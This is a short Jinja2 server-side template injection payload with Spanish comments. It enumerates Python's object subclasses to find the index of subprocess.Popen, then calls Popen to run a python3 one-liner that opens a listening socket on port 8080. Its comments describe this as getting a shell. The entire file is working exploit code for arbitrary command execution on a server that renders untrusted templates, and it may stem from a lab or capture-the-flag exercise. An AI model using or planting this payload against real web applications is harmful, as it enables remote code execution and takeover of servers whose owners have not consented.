{% set l = ''.__class__.__mro__[1].__subclasses__() %}
{% for x in l %}     
        {% if x %}
        <p>{{loop.index0}} - {{x[0]}}</p>
        {% endif %}
{% endfor %}
{#
    Así conseguimos el idx de Popen
#}
{% set res = ''.__class__.__mro__[1].__subclasses__()[223](["/usr/bin/python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('0.0.0.0', 8080)); s.listen(1); sc,_ = s.accept(); print(sc.recv(1024).decode()); sc.close(); s.close();"], stdout=-1) %}
{{ res.communicate()[0] }}         

{#
    Así abrimos una shell (subprocess.PIPE=-1)    
#} 